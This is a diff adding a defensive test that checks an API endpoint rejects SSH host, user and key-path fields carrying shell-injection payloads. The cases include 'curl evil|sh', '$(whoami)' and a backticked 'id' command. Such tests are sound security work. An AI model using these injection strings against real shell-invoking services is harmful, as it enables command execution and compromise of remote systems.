@@ -413,6 +413,22 @@ describe('API /api/openclaw/test', () => {
     assert.ok(data.error);
   });
 
+  it('POST /api/openclaw/test rejects injection-shaped SSH fields with 400 (#312)', async () => {
+    // host/sshUser/sshKeyPath are interpolated into a shell `ssh` command, so
+    // shell metacharacters must be rejected before any shell-out. A valid base
+    // returns a 200 results object (see next test); these must 400 instead.
+    const cases = [
+      { host: '10.0.0.1; curl evil|sh', sshUser: 'nobody', sshKeyPath: '/k', field: /host/ },
+      { host: '10.0.0.1', sshUser: 'a$(whoami)', sshKeyPath: '/k', field: /sshUser/ },
+      { host: '10.0.0.1', sshUser: 'nobody', sshKeyPath: '/k`id`', field: /sshKeyPath/ }
+    ];
+    for (const c of cases) {
+      const { status, data } = await request(server, 'POST', '/api/openclaw/test', c);
+      assert.equal(status, 400, `expected 400 for ${JSON.stringify(c)}`);
+      assert.match(data.error, c.field);
+    }
+  });
+
   it('POST /api/openclaw/test returns results object', async () => {
     const { status, data } = await request(server, 'POST', '/api/openclaw/test', {
       host: '127.0.0.1',
